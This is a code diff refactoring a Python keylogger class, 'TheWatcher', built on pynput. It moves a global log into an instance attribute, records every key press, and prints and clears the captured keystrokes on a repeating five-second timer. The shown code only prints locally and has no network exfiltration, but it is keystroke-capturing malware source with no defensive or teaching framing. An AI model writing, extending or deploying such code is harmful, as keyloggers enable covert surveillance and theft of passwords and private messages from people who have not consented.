@@ -1,24 +1,26 @@
 import pynput.keyboard as keyboard
 import threading
 
-log = ""
-
 class TheWatcher:
+ def __init__(self):
+  self.log = ""
+
+ def log_appender(self,string):
+  self.log = self.log + string
 
  def callingBack(self, key):
-  global log 
   try:
-   log = log + str(key.char)
+   current_key = str(key.char)
   except AttributeError:
    if key == key.space:
-    log = log + " "
+    current_key = " "
    else:
-    log = log + " " + str(key) + " "
+    current_key = " " + str(key) + " "
+  self.log_appender(current_key)
 
  def report(self):
-  global log
-  print(log)
-  log = ""
+  print(self.log)
+  self.log = ""
   start_Timer = threading.Timer(5, self.report)
   start_Timer.start()
 
